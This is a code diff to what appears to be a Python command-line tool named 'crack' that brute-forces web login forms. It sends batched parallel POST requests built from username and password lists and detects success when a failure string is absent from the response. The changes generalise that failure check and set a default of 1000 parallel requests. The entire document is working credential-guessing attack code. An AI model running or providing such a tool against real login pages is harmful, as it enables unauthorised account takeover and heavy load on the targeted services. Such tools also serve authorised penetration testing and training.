@@ -30,18 +30,19 @@ def coroutine(f):
 @click.option("-p", "password", type=str, help="Single known password")
 @click.option("-U", "user_list", type=Path, help="List of users to try")
 @click.option("-P", "password_list", type=Path, help="List of passwords to try")
-@click.option("--params", type=str, help="Request string like 'USER=userkey&PASS=passkey&ANYTHING=anything")
-@click.option("-b", "batch_size", type=int, help="Number of parallel requests")
+@click.option("--params", type=str, required=True, help="Request string like 'USER=userkey&PASS=passkey&ANYTHING=anything")
+@click.option("--fail", type=str, required=True, help="Content in website body when login failed")
+@click.option("-b", "batch_size", type=int, default=1000, help="Number of parallel requests")
 @click.option("-t", "threads", type=int, default=8)
 @coroutine
-async def crack(url:str, user:str, password:str, user_list:Path, password_list:Path, params:str, batch_size:int, threads:int):
+async def crack(url:str, user:str, password:str, user_list:Path, password_list:Path, params:str, fail:str, batch_size:int, threads:int):
     _check_inputs(url, user, password, user_list, password_list)
     request_data = RequestData(params)
     users = user_list.read_text("latin-1").splitlines() if user_list else [user]
     passwords = password_list.read_text("latin-1").splitlines() if password_list else [password]
     myconn = aiohttp.TCPConnector(limit=10)
     async with ClientSession(connector=myconn) as session:
-        async for batch in batched_tasks((asyncio.ensure_future(post_and_check(url, data, session)) for data in permutations(users, passwords, request_data)), batch_size):
+        async for batch in batched_tasks((asyncio.ensure_future(post_and_check(url, data, fail, session)) for data in permutations(users, passwords, request_data)), batch_size):
             results = await asyncio.gather(*batch, return_exceptions=True)
             for result in results:
                 if isinstance(result, Exception):
@@ -99,10 +100,10 @@ def permutations(users, passwords, request_data):
             yield request_data.format(user, password)
            
 
-async def post_and_check(url, data, session:ClientSession) -> bool:
+async def post_and_check(url, data, fail, session:ClientSession) -> bool:
     async with session.post(url, data=data) as response:
         result = await response.text()
-        if "Invalid username or password" not in result:
+        if fail not in result:
             logger.info("Successful login for %s", data)
             sys.exit(0)
         logger.debug("Unsuccessful login for %s", data)
